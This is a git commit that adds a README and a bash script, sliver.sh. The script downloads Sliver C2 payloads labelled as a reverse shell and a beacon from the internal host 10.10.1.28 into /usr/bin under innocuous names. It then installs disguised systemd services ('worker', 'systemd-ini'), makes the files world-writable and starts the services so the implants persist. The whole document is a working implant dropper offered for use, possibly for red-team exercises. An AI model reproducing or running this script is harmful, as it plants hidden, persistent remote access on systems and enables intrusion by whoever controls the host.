3eea9fb8d332507daa6350b7265605a2f9a4ce44
Aaron Haymore <52760493+0xZon@users.noreply.github.com>
2023-02-27 20:59:42 -0700

    .

---
+++ README.md
@@ -0,0 +1,3 @@
+# Sliver.sh
+This will download a malicous service that will give sliver a connection back. Make sure to change the IP in sliver.sh and the path to your sliver payload
+
---
+++ sliver.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+#Rev shell
+wget 10.10.1.28/sliverPayloads/BEAUTIFUL_APPLAUSE -O /usr/bin/start
+wget 10.10.1.28/worker.service -O /etc/systemd/system/worker.service
+
+#Beacon
+wget 10.10.1.28/sliverPayloads/NOTABLE_FROWN -O /usr/bin/sys
+wget 10.10.1.28/worker.service -O /etc/systemd/system/systemd-ini.service
+
+chmod 777 /usr/bin/start
+chmod 777 /usr/bin/sys
+
+sleep 5
+systemctl enable worker
+systemctl start worker
+
+sleep 5
+systemctl enable systemd-ini
+systemctl start systemd-ini
